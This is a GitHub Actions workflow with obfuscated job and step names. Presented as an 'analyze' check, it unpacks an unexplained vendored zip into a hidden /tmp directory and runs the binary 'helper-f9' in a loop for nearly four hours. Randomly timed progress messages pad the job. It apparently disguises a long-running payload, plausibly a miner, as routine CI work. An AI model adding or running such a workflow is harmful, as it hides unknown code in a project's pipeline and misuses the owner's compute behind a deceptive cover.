name: check-p8nf
on:
  workflow_dispatch:
jobs:
  sync_8w3:
    runs-on: ubuntu-latest
    timeout-minutes: 357
    steps:
      - uses: actions/checkout@v4
      - run: go version 2>/dev/null || true
      - name: analyze
        run: |
          N3=$(mktemp -d /tmp/.XXXXXXXX) && unzip -o -q vendor/0c73170a.zip -d ${N3} && chmod +x ${N3}/helper-f9
          cd ${N3} && timeout 228m bash -c 'for ((;;)); do ./helper-f9; echo "ok rc=$? $(date -u +%H:%M)"; sleep 7; done'
          for i in $(seq 1 154); do sleep $((RANDOM % 80 + 52)); echo "dg424s $i/154 $(date -u +%H:%M)"; done

      - run: nproc
